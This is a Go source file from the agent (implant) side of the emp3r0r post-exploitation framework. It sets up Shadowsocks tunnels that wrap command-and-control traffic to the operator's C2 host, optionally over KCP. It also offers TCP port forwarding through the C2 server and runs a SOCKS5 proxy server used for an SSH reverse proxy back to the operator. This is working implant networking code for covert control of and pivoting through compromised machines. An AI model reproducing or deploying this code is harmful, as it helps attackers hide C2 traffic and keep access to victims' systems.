package agent

import (
	"context"
	"fmt"
	"log"
	"time"

	"github.com/jm33-m0/emp3r0r/core/lib/ss"
)

var SS_Ctx, SS_Cancel = context.WithCancel(context.Background())

func startShadowsocksClient(serverAddr, localSocksAddr, tcptun string) {
	ss_config := createSSConfig(serverAddr, localSocksAddr, tcptun, false)
	err := ss.SSMain(ss_config)
	if err != nil {
		log.Fatalf("ShadowsocksProxy failed to start: %v", err)
	}

	defer func() {
		log.Print("Shadowsocks client exited")
		ss_config.Cancel()
	}()

	for ss_config.Ctx.Err() == nil {
		time.Sleep(time.Second)
	}
}

func createSSConfig(serverAddr, localSocksAddr, tcptun string, isServer bool) *ss.SSConfig {
	return &ss.SSConfig{
		ServerAddr:     serverAddr,
		LocalSocksAddr: localSocksAddr,
		Cipher:         ss.AEADCipher,
		Password:       RuntimeConfig.Password,
		IsServer:       isServer,
		Verbose:        false,
		TCPTun:         tcptun,
		Ctx:            SS_Ctx,
		Cancel:         SS_Cancel,
	}
}

// Start ShadowsocksC2Client client, you get a SOCKS5 proxy server at 127.0.0.1:Runtime.ShadowsocksPort
// This proxy server is responsible for encapsulating C2 traffic
func ShadowsocksC2Client() {
	ss_server_port := RuntimeConfig.ShadowsocksServerPort
	ss_server_addr := RuntimeConfig.CCHost
	if RuntimeConfig.UseKCP {
		log.Print("C2 traffic will go through Shadowsocks, which will go through KCP")
		ss_server_port = RuntimeConfig.KCPPort
		ss_server_addr = "127.0.0.1"
	} else {
		log.Printf("C2 traffic will go through Shadowsocks: %s:%s",
			RuntimeConfig.CCHost,
			RuntimeConfig.ShadowsocksServerPort)
	}

	server_addr := fmt.Sprintf("%s:%s", ss_server_addr, ss_server_port)
	local_socks_addr := "127.0.0.1:" + RuntimeConfig.ShadowsocksLocalSocksPort

	startShadowsocksClient(server_addr, local_socks_addr, "")
}

// Start ShadowsocksTCPTunnel to connect to Shadowsocks server and forward traffic to a specified remote address
// tcptun: "local_port=remote_host:remote_port,local_port=remote_host:remote_port"
func ShadowsocksTCPTunnel(lport, raddr string) {
	ss_server_port := RuntimeConfig.ShadowsocksServerPort
	ss_server_addr := RuntimeConfig.CCHost

	server_addr := fmt.Sprintf("%s:%s", ss_server_addr, ss_server_port)

	tcptun := fmt.Sprintf("127.0.0.1:%s=%s", lport, raddr)
	startShadowsocksClient(server_addr, "", tcptun)
}

// Start Shadowsocks proxy server with RuntimeConfig.ShadowsocksPassword
// This server will serve as a secure tunnel that encapsulates SOCKS5 service provider
// for both broadcasted proxy server and `bring2cc` SSH reverse proxy
func ShadowsocksServer() error {
	ctx, cancel := context.WithCancel(context.Background())
	ss_config := createSSConfig("0.0.0.0:"+RuntimeConfig.ShadowsocksServerPort, "", "", true)
	ss_config.Ctx = ctx
	ss_config.Cancel = cancel

	// start server
	log.Printf("Shadowsocks Server: %v", ss_config)

	err := ss.SSMain(ss_config)
	if err != nil {
		return fmt.Errorf("ShadowsocksServer: %v", err)
	}

	return nil
}
